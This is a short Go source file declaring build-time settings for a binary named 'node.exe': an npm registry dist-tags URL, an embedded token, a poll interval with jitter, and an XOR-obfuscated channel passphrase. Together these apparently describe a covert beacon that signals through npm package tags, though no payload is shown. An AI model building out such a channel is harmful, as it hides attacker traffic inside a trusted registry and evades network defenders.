package main

// Everything here is replaced at build time with -ldflags -X, so a generated
// binary carries its whole configuration: registry, package, token, timing.
// A built node.exe therefore needs no command line at all.
var (
	apiTemplate   = "https://registry.npmjs.org/-/package/%s/dist-tags"
	embeddedToken = ""
	embeddedPkg   = ""
	embeddedEvery = "" // seconds between polls, as a string
	embeddedJit   = "" // jitter seconds, as a string
	// tagValue is the version every dist-tag points at. It must already exist
	// in the package: npm rejects a tag pointing at an unknown version with 400.
	tagValue = "1.0.0"
	// embeddedKey is the channel passphrase XOR-obfuscated with
	// sha256(package). Empty means an unencrypted channel.
	embeddedKey = ""
)
